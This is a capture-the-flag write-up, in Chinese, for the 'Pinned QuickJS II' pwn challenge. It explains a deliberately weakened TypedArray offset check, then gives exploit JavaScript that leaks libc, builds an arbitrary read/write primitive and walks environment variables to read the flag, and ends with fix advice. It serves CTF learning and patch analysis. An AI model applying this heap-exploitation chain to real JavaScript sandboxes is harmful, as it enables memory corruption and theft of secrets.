# Pinned QuickJS II

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-93590E02` · 状态 solved
```

## 一句话

Same service, different production patch.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-93590E02.zip` | 1.5 MB | `941863886718…` |
| `zip/patch.diff` | 1.7 KB | `9c11b2e07be4…` |
| `zip/README.md` | 857 B | `464fe1815c02…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 题面与附件

• 题目：Pinned QuickJS II，挑战 ID AUTHORED-93590E02。
• 服务：TCP JSON-Lines，{"code":"<javascript>"}\n 请求，单行 JSON 响应；每条连接一个 fresh worker。
• 目标：从 worker 环境读取 QJS_CTF_FLAG 并提交。
• 附件：
• pinned_qjs2/patch.diff
• pinned_qjs2/quickjs-base-bundle.tar.gz
• 本实例服务地址为 172.16.177.2:1337。

### 观察与证据

1. 补丁保留长度校验，但删除了 byteOffset 约束

pinned_qjs2/patch.diff:19-22 删除了无长度分支中的 offset > abuf->byte_length 检查：

```
if (JS_IsUndefined(argv[2])) {
if (abuf->detached) {
JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
-                    goto fail;
-                }
```

-                if (offset > abuf->byte_length) {
-                invalid_offset:
-                    JS_ThrowRangeError(ctx, "invalid offset"); goto fail; }

+                /* byteOffset is an Index in [0, 2^53); the view range is

+                   validated together with the length below. */

显式长度分支也只检查长度（pinned_qjs2/patch.diff:33-35）：

-                if ((offset + (len << size_log2)) > abuf->byte_length) {

+                /* The view length is bounded by the ArrayBuffer length. */

+                if ((len << size_log2) > abuf->byte_length) {

因此 offset 完全不受 byte_length 限制，只有 len 受限制。

2. 无长度分支发生无符号下溢

原实现（pinned_qjs2/third_party/quickjs/src/quickjs.c:59789）在无长度分支：

```
len = (abuf->byte_length - offset) >> size_log2;
```

当 offset > byte_length 时，byte_length - offset 在 64 位无符号运算下下溢，变成一个巨大值。随后 typed_array_init()：

ta->offset = offset;              // uint32_t，截断

```
ta->length = len << size_log2;
```

p->u.array.count = len;           // uint32_t，截断为 0xfffffff0

p->u.array.u.ptr = abuf->data + offset; // 向前越界

例如 0x4000 的 buffer 加 offset = 0x4010：

```js
var ab = new ArrayBuffer(0x4000);
var o = new Uint8Array(ab, 0x4010);
JSON.stringify([o.length, o[0], o[1], o[0x100]]);
```

远程返回：

[-16,0,0,0]

o.length 显示为有符号 -16，但内部 count 是 0xfffffff0；整数下标访问仍走 fast path，只判断 idx < count，因此可读写从 ab->data + 0x4010 开始的大范围内存。

3. 可写范围不是无限的

Uint8Array 下标是 32 位无符号，count 很大，但地址空间并不连续。远程尝试：

```
o[0x100000] = 67;
```

worker 直接关闭（WorkerClosedError: worker stdout closed），说明跨过当前堆映射会触发段错误。因此实际利用只扫描较小的堆范围。

### 分析与验证

利用脚本：

• pinned_qjs2/exploit2.js
• pinned_qjs2/solve2.py

**3.1 构造 OOB view 并泄露 unsorted bin**

```js
var ab = new ArrayBuffer(0x4000);
var o  = new Uint32Array(ab, 0x4010); // 从下一个 glibc chunk 的 user data 开始
```

接着在 view 前面释放一个 0x4000 的 ArrayBuffer：

```js
function f() {
var t = new ArrayBuffer(0x4000);
var g = new ArrayBuffer(0x4000); // guard，阻止 t 与 top 合并
return g;
}
var guard = f();
var fd = o[1] * 0x100000000 + o[0];
```

t 被释放后进入 unsorted bin，o[0] / o[1] 就是它的 fd / bk，指向 libc 的 main_arena。guard 保证 t 不会与 top chunk 合并。

**3.2 复用释放 chunk 放置 victim**

```js
var abv = new ArrayBuffer(0x100);
var U = new Uint8Array(abv);
U[0x80] = 0xAB;
var victims = [];
for (var i = 0; i < 600; i++)
victims.push(new Uint8Array(abv, 0, 32));
```

这些 Uint8Array 的 72 字节 JSObject 会从释放 chunk 切出的 4 KiB arena 中分配。扫描 view 的前 0x20000 字节，按 JSObject + 0x12 的 class_id == 23 找到 victim：

```js
for (var j = 0; j < 0x20000; j += 8) {
var w = o[(j + 0x12) >> 2];
var cid = (w >>> (((j + 0x12) & 3) * 8)) & 0xffff;
if (cid == 23) hits.push(j);
}
```

**3.3 修改 pointer/count 得到任意读写**

```js
var h0 = hits[0];
var pidx  = (h0 + 0x30) >> 2; // u.array.u.ptr
var paddr = o[pidx] + o[pidx + 1] * 0x100000000;
var naddr = paddr + 0x80;
o[pidx]     = naddr % 0x100000000;
o[pidx + 1] = (naddr - naddr % 0x100000000) / 0x100000000;
```

o[(h0 + 0x38) >> 2] = 0x100;  // count

找到 victims[i][0] === 0xAB 的 victim 后，rw = victims[idx] 就是任意地址读写原语；setptr() 改写 pointer，rd64() / rd32() / rdstr() 负责读取。

**3.4 恢复 libc 并遍历环境变量**

先用已知的 Ubuntu 24.04 glibc 2.39 unsorted-bin 偏移：

```js
var base = fd - 0x203b20;
```

并检查 base 处是否为 \x7fELF；如果不匹配，则从 fd 向下按页扫描 ELF header 作为 fallback。

读取：

```js
var envp = rd64(base + 0x20ad58);
```

0x20ad58 是 glibc 2.39-0ubuntu8.6 的 __environ 偏移；本环境可能返回 0，因此脚本还有 fallback：

1. 解析 libc 的 program headers，找到可写 PT_LOAD；
2. 扫描该段中的栈指针；
3. 对每个候选，分别按 __environ 或 __libc_stack_end（&argc）解释；
4. 遍历 envp，匹配 QJS_CTF_FLAG=。

核心 fallback 见 pinned_qjs2/exploit2.js:118-143。

### 结果

远程返回的 result 中包含：

```
QJS_CTF_FLAG=«FLAG»
```

Flag：

«FLAG»

平台提交结果：

```
{"correct":true,"solve_time_s":364.6,"solve_rank":79,"challenge_fully_solved":true}
```

复现：

```bash
python pinned_qjs2/solve2.py
```

脚本默认连接 172.16.177.2:1337；如实例地址变化，修改 solve2.py 的 HOST / PORT。

### 修复建议

1. 在无长度分支恢复 offset <= abuf->byte_length 检查，再做减法，避免无符号下溢：

```
if (offset > abuf->byte_length)
goto invalid_offset;
len = (abuf->byte_length - offset) >> size_log2;
```

2. 显式长度分支应同时验证 offset 和长度：

```
if (offset > abuf->byte_length ||
```

len > ((uint64_t)abuf->byte_length - offset) >> size_log2)

```
goto invalid_length;
```

3. 对 resizable ArrayBuffer，在 view 创建后仍需在元素访问时校验当前 bounds；不能只依赖创建时的 count/ptr。

## 结果

- flag sha256：`d2698d28c443e9433cefe40244ea13f5fdadf56eba85d6f9fedf2cce6cc52fd5`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/solve2.py`
- `solve/exploit2.js`

## 待核实

- 本条目由 WP 第 25 节《Pinned QuickJS II》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
